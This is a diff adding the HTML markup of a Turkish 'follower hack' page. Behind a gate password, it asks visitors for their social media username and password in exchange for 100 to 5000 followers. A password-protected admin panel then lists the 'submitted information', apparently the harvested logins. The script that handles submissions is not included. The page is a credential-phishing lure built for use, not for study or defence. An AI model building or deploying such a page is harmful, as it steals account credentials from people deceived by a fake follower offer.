@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Takipçi Hilesi</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container" id="login-container">
+        <h1>TAKİPÇİ HİLESİ</h1>
+        <input type="password" id="login-password" placeholder="Şifre">
+        <button onclick="login()">Giriş Yap</button>
+        <p id="login-error"></p>
+    </div>
+
+    <div class="container hidden" id="menu-container">
+        <button onclick="showForm()">1. Takipçi Gönder</button>
+        <button onclick="showAdminLogin()">2. Admin</button>
+    </div>
+
+    <div class="container hidden" id="form-container">
+        <input type="text" id="username" placeholder="Kullanıcı Adı">
+        <input type="password" id="userpass" placeholder="Şifre">
+        <p>Kaç takipçi istersiniz?</p>
+        <label><input type="radio" name="count" value="100"> 100</label>
+        <label><input type="radio" name="count" value="2500"> 2500</label>
+        <label><input type="radio" name="count" value="5000"> 5000</label>
+        <button onclick="submitForm()">Gönder</button>
+    </div>
+
+    <div class="container hidden" id="admin-login-container">
+        <input type="password" id="admin-password" placeholder="Admin Şifresi">
+        <button onclick="adminLogin()">Giriş Yap</button>
+        <p id="admin-login-error"></p>
+    </div>
+
+    <div class="container hidden" id="admin-panel">
+        <h2>Gönderilen Bilgiler</h2>
+        <div id="admin-data"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
